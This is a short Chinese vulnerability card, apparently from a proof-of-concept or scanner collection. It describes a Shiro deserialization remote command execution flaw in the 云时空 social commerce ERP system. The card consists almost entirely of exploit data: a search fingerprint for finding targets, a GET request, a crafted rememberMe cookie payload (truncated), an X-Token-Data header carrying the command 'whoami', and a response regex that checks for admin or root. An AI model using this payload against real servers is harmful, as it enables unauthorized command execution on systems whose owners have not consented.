# 云时空社会化商业ERPshiro反序列化远程命令执行漏洞

- **系统**：云时空社会化商业ERPshiro　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="云时空社会化商业ERP系统"`
- **请求**：`GET /static/js/public.js HTTP/1.1`
- **关键头**：`Cookie: rememberMe=ZkQwQ0NGMEY4ZDhhZjRkQk1PeiBePyZcAaJE7Om+C0hA3jDtN5dVqFAyh+gGxrjM3fdJJ…`　`X-Token-Data: whoami`
- **预期**：200　|　^(?=.*?(?:admin|root)).*?$